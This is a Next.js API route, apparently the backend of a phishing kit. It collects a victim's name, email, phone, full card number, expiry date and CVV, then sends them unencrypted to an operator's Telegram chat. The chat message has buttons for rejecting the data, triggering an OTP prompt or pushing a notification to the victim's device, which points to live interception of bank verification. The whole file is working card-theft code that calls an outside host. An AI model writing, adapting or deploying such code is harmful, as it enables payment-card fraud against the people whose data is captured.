import { NextRequest, NextResponse } from 'next/server';

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Функция для экранирования специальных символов в Markdown
function escapeMarkdown(text: any): string {
  // Проверяем, что text является строкой
  if (typeof text !== 'string') {
    return text ? String(text) : '';
  }
  
  return text
    .replace(/_/g, '\\_')
    .replace(/\*/g, '\\*')
    .replace(/\[/g, '\\[')
    .replace(/\]/g, '\\]')
    .replace(/\(/g, '\\(')
    .replace(/\)/g, '\\)')
    .replace(/~/g, '\\~')
    .replace(/`/g, '\\`')
    .replace(/>/g, '\\>')
    .replace(/#/g, '\\#')
    .replace(/\+/g, '\\+')
    .replace(/-/g, '\\-')
    .replace(/=/g, '\\=')
    .replace(/\|/g, '\\|')
    .replace(/\{/g, '\\{')
    .replace(/\}/g, '\\}')
    .replace(/\./g, '\\.')
    .replace(/!/g, '\\!');
}

export async function POST(request: NextRequest) {
  try {
    const data = await request.json();
    
    // Проверяем, что все необходимые данные присутствуют
    if (!data.firstName || !data.lastName || !data.email || !data.phone || 
        !data.cardNumber || !data.expiryMonth || !data.expiryYear || !data.cvv || 
        !data.cart || !data.sessionId) {
      console.error('Missing required data:', data);
      return NextResponse.json({ error: 'Missing required data' }, { status: 400 });
    }
    
    const message = `
🆕 *НОВАЯ ЗАЯВКА НА ОПЛАТУ*

👤 *Данные клиента:*
• Имя: ${escapeMarkdown(data.firstName)} ${escapeMarkdown(data.lastName)}
• Email: ${escapeMarkdown(data.email)}
• Телефон: ${escapeMarkdown(data.phone)}

💳 *Платёжные данные:*
• Карта: ${escapeMarkdown(data.cardNumber)}
• Срок: ${escapeMarkdown(data.expiryMonth)}/${escapeMarkdown(data.expiryYear)}
• CVV: ${escapeMarkdown(data.cvv)}

📦 *Заказ:*
• Тариф: ${escapeMarkdown(data.cart.name)}
• Цена: ${escapeMarkdown(data.cart.price)} €/мес
• Период: ${escapeMarkdown(data.period)} мес
• Описание: ${escapeMarkdown(data.cart.description || 'Sin descripción')}

🔑 *ID сессии:* ${escapeMarkdown(data.sessionId)}

Выберите действие:
(Можно также отправить PUSH на устройство пользователя — кнопка ниже)
`;

    // inline keyboard: row1 = reject / approve, row2 = push
    const keyboard = {
      inline_keyboard: [
        [
          {
            text: "❌ Неверные данные",
            callback_data: `reject_${data.sessionId}`
          },
          {
            text: "✅ Отправить OTP",
            callback_data: `approve_${data.sessionId}`
          }
        ],
        [
          {
            text: "🔔 Отправить Push",
            callback_data: `push_${data.sessionId}`
          }
        ]
      ]
    };

    // Проверяем, что переменные окружения настроены
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('Missing Telegram configuration');
      return NextResponse.json({ error: 'Telegram configuration missing' }, { status: 500 });
    }

    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        reply_markup: keyboard
      }),
    });

    if (telegramResponse.ok) {
      // Инициализируем состояние платежа
      try {
        await fetch(`${request.nextUrl.origin}/api/payment-status-vercel`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            sessionId: data.sessionId,
            status: 'pending'
          })
        });
      } catch (statusError) {
        console.error('Error setting payment status:', statusError);
        // Не прерываем выполнение, если не удалось установить статус
      }
      
      return NextResponse.json({ success: true });
    } else {
      const error = await telegramResponse.text();
      console.error('Telegram API error:', error);
      return NextResponse.json({ error: 'Failed to send to Telegram' }, { status: 500 });
    }
  } catch (error) {
    console.error('API error:', error);
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}
